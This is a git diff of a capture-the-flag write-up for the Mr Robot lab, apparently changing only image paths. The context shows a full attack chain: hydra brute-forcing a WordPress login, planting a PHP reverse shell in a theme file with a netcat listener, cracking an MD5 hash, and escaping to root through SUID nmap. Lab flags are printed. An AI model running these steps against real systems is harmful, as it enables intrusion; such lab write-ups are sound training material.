@@ -24,7 +24,7 @@ Started with a full service/version scan:
 nmap -sV -A 10.82.169.249
 ```
 
-![nmap scan](./images/01-nmap-scan.png)
+![nmap scan](./screnshots/01-nmap-scan.png)
 
 Results:
 
@@ -36,7 +36,7 @@ Results:
 
 Only a web server of real interest — visiting port 80 dropped an in-character `fsociety` terminal easter egg with no useful commands.
 
-![fsociety easter egg](./images/02-fsociety-easter-egg.png)
+![fsociety easter egg](./screnshots/02-fsociety-easter-egg.png)
 
 ## 2. Directory & File Enumeration
 
@@ -46,13 +46,13 @@ Brute-forced content with **Gobuster**:
 gobuster dir -u http://10.82.169.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-![gobuster scan](./images/03-gobuster-scan.png)
+![gobuster scan](./screnshots/03-gobuster-scan.png)
 
 Interesting hits: `/robots`, `/readme`, `/license`, `/wp-login.php`.
 
 `/robots` revealed:
 
-![robots.txt](./images/04-robots-txt.png)
+![robots.txt](./screnshots/04-robots-txt.png)
 
 ```
 User-agent: *
@@ -62,7 +62,7 @@ key-1-of-3.txt
 
 **Key 1** was sitting right there at `/key-1-of-3.txt`:
 
-![key 1](./images/05-key1.png)
+![key 1](./screnshots/05-key1.png)
 
 ```
 073403c8a58a1f80d943455fb30724b9
@@ -76,9 +76,9 @@ sort fsocity.dic | uniq > wordlist
 
 `/license` teased a hint before scrolling down to reveal a base64 string:
 
-![license hint](./images/06-license-hint.png)
+![license hint](./screnshots/06-license-hint.png)
 
-![license base64 string](./images/07-license-base64.png)
+![license base64 string](./screnshots/07-license-base64.png)
 
 ```
 ZWxsaW90OkVSMjgtMDY1Mgo=
@@ -86,7 +86,7 @@ ZWxsaW90OkVSMjgtMDY1Mgo=
 
 Ran it through a hash identifier first to confirm the encoding:
 
-![hash identifier](./images/08-hash-identifier.png)
+![hash identifier](./screnshots/08-hash-identifier.png)
 
 Decoded:
 
@@ -94,7 +94,7 @@ Decoded:
 echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
 ```
 
-![base64 decode](./images/09-base64-decode.png)
+![base64 decode](./screnshots/09-base64-decode.png)
 
 ```
 elliot:ER28-0652
@@ -104,28 +104,28 @@ elliot:ER28-0652
 
 `/login` redirected to a WordPress login (`/wp-login.php`).
 
-![wp-login page](./images/10-wp-login.png)
+![wp-login page](./screnshots/10-wp-login.png)
 
 Rather than trust the found creds outright, validated the **username** first — the login form leaks different errors for invalid username vs. invalid password:
 
-![invalid username error](./images/11-invalid-username.png)
+![invalid username error](./screnshots/11-invalid-username.png)
 
 Inspected the form source to grab the POST parameter names (`log`, `pwd`):
 
-![source inspect](./images/12-source-inspect.png)
+![source inspect](./screnshots/12-source-inspect.png)
 
 ```bash
 hydra -L wordlist -P wordlist 10.82.169.249 http-post-form \
 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username." -V -f
 ```
 
-![hydra username brute force](./images/13-hydra-username-brute.png)
+![hydra username brute force](./screnshots/13-hydra-username-brute.png)
 
 → confirmed `elliot` is a valid username.
 
 With a valid username, the error message shifts to a password-specific one:
 
-![invalid password error](./images/14-invalid-password.png)
+![invalid password error](./screnshots/14-invalid-password.png)
 
 Brute-forced the **password** against the cleaned wordlist:
 
@@ -134,7 +134,7 @@ hydra -l elliot -P fsociety.dic 10.82.169.249 http-post-form \
 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username elliot is incorrect." -V -f
 ```
 
-![hydra password brute force](./images/15-hydra-password-brute.png)
+![hydra password brute force](./screnshots/15-hydra-password-brute.png)
 
 → confirmed `elliot:ER28-0652` (matching the base64 find).
 
@@ -142,11 +142,11 @@ hydra -l elliot -P fsociety.dic 10.82.169.249 http-post-form \
 
 Logged into `/wp-admin` as `elliot` — an administrator account with access to **Appearance → Editor**.
 
-![wp-admin dashboard](./images/16-wp-admin-dashboard.png)
+![wp-admin dashboard](./screnshots/16-wp-admin-dashboard.png)
 
 Abused the built-in PHP template editor: overwrote `404.php` (Twenty Fifteen theme) with a [pentestmonkey PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell), pointed `$ip` at my attacking box, and saved.
 
-![reverse shell editor](./images/17-reverse-shell-editor.png)
+![reverse shell editor](./screnshots/17-reverse-shell-editor.png)
 
 Started a listener:
 
@@ -154,7 +154,7 @@ Started a listener:
 nc -lnvp 8888
 ```
 
-![nc listener](./images/18-nc-listener.png)
+![nc listener](./screnshots/18-nc-listener.png)
 
 Triggered the payload by visiting:
 
@@ -162,7 +162,7 @@ Triggered the payload by visiting:
 http://10.82.151.52/wp-includes/themes/TwentyFifteen/404.php
 ```
 
-![shell connect](./images/19-shell-connect.png)
+![shell connect](./screnshots/19-shell-connect.png)
 
 → shell as `daemon`.
 
@@ -170,7 +170,7 @@ http://10.82.151.52/wp-includes/themes/TwentyFifteen/404.php
 
 Enumerated `/home`:
 
-![home robot directory](./images/20-home-robot-dir.png)
+![home robot directory](./screnshots/20-home-robot-dir.png)
 
 ```bash
 cd /home/robot
@@ -188,7 +188,7 @@ Cracked the MD5 with `john` (rockyou.txt):
 john md5.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![john crack](./images/21-john-crack.png)
+![john crack](./screnshots/21-john-crack.png)
 
 → `abcdefghijklmnopqrstuvwxyz`
 
@@ -202,11 +202,11 @@ su robot
 # Password: abcdefghijklmnopqrstuvwxyz
 ```
 
-![su robot](./images/22-su-robot.png)
+![su robot](./screnshots/22-su-robot.png)
 
 **Key 2**:
 
-![key 2](./images/23-key2.png)
+![key 2](./screnshots/23-key2.png)
 
 ```
 822c73956184f694993bede3eb39f959
@@ -220,7 +220,7 @@ Hunted for SUID binaries:
 find / -perm -4000 2>/dev/null
 ```
 
-![SUID find](./images/24-suid-find.png)
+![SUID find](./screnshots/24-suid-find.png)
 
 `/usr/local/bin/nmap` stood out — not a default SUID binary. Checked [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/), which documents an interactive-mode shell escape for legacy nmap versions (2.02–5.21):
 
@@ -229,13 +229,13 @@ nmap --interactive
 nmap> !sh
 ```
 
-![nmap interactive root shell](./images/25-nmap-interactive-root.png)
+![nmap interactive root shell](./screnshots/25-nmap-interactive-root.png)
 
 → instant root shell.
 
 **Key 3**:
 
-![key 3](./images/26-key3.png)
+![key 3](./screnshots/26-key3.png)
 
 ```
 04787ddef27c3dee1ee161b21670b4e4
